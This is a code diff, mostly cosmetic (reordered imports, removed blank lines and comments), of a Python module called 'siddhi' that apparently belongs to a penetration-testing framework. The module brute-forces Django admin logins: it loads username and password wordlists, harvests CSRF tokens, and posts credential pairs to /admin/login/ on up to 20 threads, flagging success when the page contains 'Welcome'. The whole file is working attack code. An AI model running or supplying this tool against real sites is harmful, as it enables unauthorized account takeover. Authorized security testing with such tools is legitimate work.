@@ -14,34 +14,28 @@
 """
 
 
-# -*- coding: utf-8 -*-
 import sys
 sys.path.insert(0, '../../../')
 from resources.colors import *
 from resources.vmnf_validators import get_tool_scope
-
 from core.vmnf_thread_handler import ThreadPool
 from core.vmnf_thread_handler import Worker
 from core.vmnf_shared_args import VimanaSharedArgs
-
-
-from pathlib import Path
-
-import argparse
-import threading
-import queue
-from datetime import datetime
-import requests
-from requests import exceptions 
-from bs4 import BeautifulSoup
-import sys
-from time import sleep
-import os
-#from colors import *
 from resources.colors import *
+from requests import exceptions 
 from datetime import datetime
-import pathlib 
+from bs4 import BeautifulSoup
+from datetime import datetime
+from pathlib import Path
+from time import sleep
 import collections
+import threading
+import argparse
+import requests
+import pathlib 
+import queue
+import os
+
 
 
 
@@ -49,7 +43,6 @@ import collections
 class MyParser(argparse.ArgumentParser):
     def format_help(self):
         '''djonga help'''
-
 
 class siddhi:
     module_information = collections.OrderedDict() 
@@ -70,7 +63,6 @@ class siddhi:
         \r  authentication endpoints.
         
         """
-
     }
     
     module_arguments = VimanaSharedArgs().shared_help.__doc__    
@@ -81,20 +73,13 @@ class siddhi:
         self.siddhi_args = siddhi_args
         self.login_path = '/admin/login/?next=/admin/'
         self.logout_path= '/admin/logout'
-        
         abspath = os.path.dirname(__file__)
-
         self.usernames = open('{}/recs/django_users.txt'.format(abspath), 'r').readlines()
         self.passwords = open('{}/recs/django_passwords.txt'.format(abspath), 'r').readlines()
         self.userlen   = len(self.usernames)
         self.passlen   = len(self.passwords)
-
-        #self.target = siddhi_args['target']
-        #self.URL = self.target + login_path
         self.client = requests.session()
-        #self.LOGOUT_URL = self.target + logout_path
         self.token_cache = []
-
 
     def get_csrf_token(self, URL =False):
         
@@ -102,7 +87,6 @@ class siddhi:
             request_url = self.URL
         else:
             request_url = URL
-
         csrftoken = False
 
         try:
@@ -120,29 +104,22 @@ class siddhi:
         except exceptions.ConnectionError as e:
             print('[+] %s'%(e.__doc__))
             sys.exit()
-
         return(csrftoken)
-
 
     def run_brute_force(self):
         
         users_len = Yn_c + str(len(self.usernames)) + D_c
         pass_len  = Yn_c + str(len(self.passwords)) + D_c
- 
         csrftoken = False
         success_login = False
-
         djonga_start = G_c + str(datetime.now().strftime('%Y-%m-%d %H:%M:%S')) + D_c
-
 
         if self.random_token:
             csrftoken = self.get_csrf_token(False) 
         else:
             csrftoken = self.token_cache[0] 
-
         token = Rn_c + csrftoken + D_c
         userpass = R_c + str(self.username + ':' + self.password) + D_c  
-
         login_data = dict(
             username=self.username,     
             password=self.password, 
@@ -167,7 +144,6 @@ class siddhi:
         response_data = response.text
         status_code = response.status_code
         http_status = G_c + str(status_code) + D_c
-            
         runtime = '[' + G_c + str(datetime.now().strftime('%H:%M:%S')) + D_c +']'
         
         if status_code == 200 and response_data.find('Welcome') != -1:
@@ -188,43 +164,30 @@ class siddhi:
             status = R_c + 'Fail' + D_c
             token = R_c + csrftoken + D_c
 
-                
         print(" {:<25} {:<20} {:<19} {:<40} {:>10}".format(runtime, http_status, status, userpass, token))
-
 
     def worker(self):
         name = threading.currentThread().getName()
         #print('+ Thread: {}'.format(name))
-
         while True:
             self.username = self.q.get()
-
             if self.username is None:
                 self.q.task_done()
                 break
-
             for password in self.passwords:
                 self.password = password.strip()
-
-                # call method brute
                 self.run_brute_force()
                 self.djonga_start = False
-
             self.q.task_done()
 
-
     def ThreadHandler(self):
-        
         max_workers = 20
         self.djonga_start = True
         self.get_csrf_token(False)
         self.random_token = self.siddhi_args['random']
-        
         num_threads = int(self.siddhi_args['threads'])
-
         if num_threads > max_workers:
             num_threads = max_workers
-
         pool = ThreadPool(num_threads)
 
         for username in self.usernames:
@@ -234,20 +197,17 @@ class siddhi:
                 pool.add_task(self.run_brute_force)
         pool.wait_completion()
 
-
     def parse_args(self):
         ''' ~ siddhi needs only shared arguments from VimanaSharedArgs() ~'''
-
         parser = argparse.ArgumentParser(
                 add_help=False,
                 parents=[VimanaSharedArgs().args()]
         )
-
         return parser
 
     def start(self):
         handler_ns  = argparse.Namespace(
-            target          = False, #self.URL,
+            target          = False,
             port            = False,
             random          = False,
             userlist        = False,
@@ -257,11 +217,8 @@ class siddhi:
         )
         
         options = self.parse_args()
-
         handler_ns.args = options.parse_known_args(
         namespace=handler_ns)[1]
-    
-        # if scope target was not defined
         if not self.siddhi_args['scope']:
             print(VimanaSharedArgs().shared_help.__doc__)
             sys.exit(1)
@@ -272,9 +229,7 @@ class siddhi:
             self.target = 'http://' + entry
             self.URL = self.target + self.login_path
             self.LOGOUT_URL = self.target + self.logout_path
-
             djonga_start = G_c + str(datetime.now().strftime('%Y-%m-%d %H:%M:%S')) + D_c
-                
             print("\nø {}Starting Dj0nga at {}\n".format(Wn_c, djonga_start, D_c))
             sleep(1)
 
